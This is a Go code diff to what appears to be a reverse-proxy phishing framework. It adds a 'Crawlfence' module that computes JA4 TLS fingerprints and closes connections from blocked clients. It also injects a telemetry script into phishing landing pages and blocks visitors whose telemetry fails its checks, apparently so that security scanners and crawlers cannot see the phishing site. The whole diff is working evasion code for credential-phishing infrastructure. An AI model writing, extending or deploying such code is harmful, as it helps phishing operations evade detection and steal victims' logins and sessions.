@@ -82,6 +82,7 @@ type HttpProxy struct {
 	ip_mtx            sync.Mutex
 	session_mtx       sync.Mutex
 	webhook           *WebhookNotifier
+	crawlfence        *CrawlFence
 }
 
 type ProxySession struct {
@@ -122,6 +123,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		ip_sids:           make(map[string]string),
 		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
 		webhook:           NewWebhookNotifier(),
+		crawlfence:        NewCrawlFence(),
 	}
 
 	p.Server = &http.Server{
@@ -286,6 +288,46 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						}
 					}
 				}
+			}
+
+			// Crawlfence telemetry endpoint
+			cf_re := regexp.MustCompile("^\\/cf\\/([^\\/]+)$")
+			if cf_re.MatchString(req.URL.Path) {
+				ra := cf_re.FindStringSubmatch(req.URL.Path)
+				if len(ra) >= 2 {
+					session_id := ra[1]
+					if s, ok := p.sessions[session_id]; ok {
+						if req.Method == "POST" {
+							body, err := io.ReadAll(req.Body)
+							if err == nil {
+								req.Body = io.NopCloser(bytes.NewBuffer(body))
+								var telemetry TelemetryData
+								if err := json.Unmarshal(body, &telemetry); err == nil {
+									// Check telemetry against crawlfence config
+									if pl != nil && pl.Crawlfence != nil && pl.Crawlfence.Telemetry != nil && pl.Crawlfence.Telemetry.Enabled {
+										allowed, reason := p.crawlfence.CheckTelemetry(pl.Crawlfence.Telemetry, &telemetry)
+										if !allowed {
+											log.Warning("[crawlfence] blocked telemetry: session=%s reason=%s ua=%s", session_id, reason, telemetry.UserAgent)
+											return p.blockRequest(req)
+										}
+									}
+									// Store JA4 signature in session if available
+									if s.JA4Signature == "" {
+										s.JA4Signature = p.crawlfence.GetIPJA4(from_ip)
+									}
+									// Also record JA4 with user agent for learning mode
+									if s.JA4Signature != "" && pl != nil && pl.Crawlfence != nil && pl.Crawlfence.JA4Config != nil && pl.Crawlfence.JA4Config.Mode == "learn" {
+										p.crawlfence.RecordJA4(pl.Name, s.JA4Signature, from_ip, telemetry.UserAgent)
+									}
+								}
+							}
+						}
+						resp := goproxy.NewResponse(req, "application/json", 200, `{"status":"ok"}`)
+						return req, resp
+					}
+				}
+				resp := goproxy.NewResponse(req, "application/json", 404, `{"status":"not found"}`)
+				return req, resp
 			}
 
 			phishDomain, phished := p.getPhishDomain(req.Host)
@@ -1183,6 +1225,25 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 							log.Debug("js_inject: injected redirect script for session: %s", s.Id)
 							body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s.js", s.Id))
+
+							// Crawlfence telemetry script injection for landing pages
+							if pl.Crawlfence != nil && pl.Crawlfence.Enabled && pl.Crawlfence.Telemetry != nil && pl.Crawlfence.Telemetry.Enabled {
+								// Check if this is a landing page
+								for _, ph := range pl.proxyHosts {
+									if ph.is_landing {
+										phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
+										if ok {
+											landingHost := combineHost(ph.phish_subdomain, phishDomain)
+											if resp.Request.Host == landingHost {
+												cfScript := GenerateCrawlfenceScript(s.Id)
+												body = p.injectJavascriptIntoBody(body, cfScript, "")
+												log.Debug("crawlfence: injected telemetry script for session: %s", s.Id)
+												break
+											}
+										}
+									}
+								}
+							}
 						}
 					}
 				}
@@ -1655,6 +1716,37 @@ func (p *HttpProxy) httpsWorker() {
 			hostname := tlsConn.Host()
 			if hostname == "" {
 				return
+			}
+
+			// Crawlfence JA4 fingerprinting
+			var ja4Sig string
+			if tlsConn.ClientHelloMsg != nil {
+				ja4 := GenerateJA4(tlsConn.ClientHelloMsg)
+				if ja4 != nil {
+					ja4Sig = ja4.Raw
+					from_ip := strings.Split(c.RemoteAddr().String(), ":")[0]
+
+					// Check if phishlet has crawlfence enabled
+					pl := p.getPhishletByPhishHost(hostname)
+					if pl != nil && pl.Crawlfence != nil && pl.Crawlfence.Enabled {
+						if pl.Crawlfence.JA4Config != nil {
+							switch pl.Crawlfence.JA4Config.Mode {
+							case "learn":
+								p.crawlfence.RecordJA4(pl.Name, ja4Sig, from_ip, "")
+							case "block":
+								allowed, reason := p.crawlfence.CheckJA4(pl.Crawlfence.JA4Config, ja4Sig)
+								if !allowed {
+									log.Warning("[crawlfence] blocked JA4=%s reason=%s ip=%s", ja4Sig, reason, from_ip)
+									c.Close()
+									return
+								}
+							}
+						}
+					}
+
+					// Store JA4 by IP for session association
+					p.crawlfence.SetIPJA4(from_ip, ja4Sig)
+				}
 			}
 
 			if !p.cfg.IsActiveHostname(hostname) {
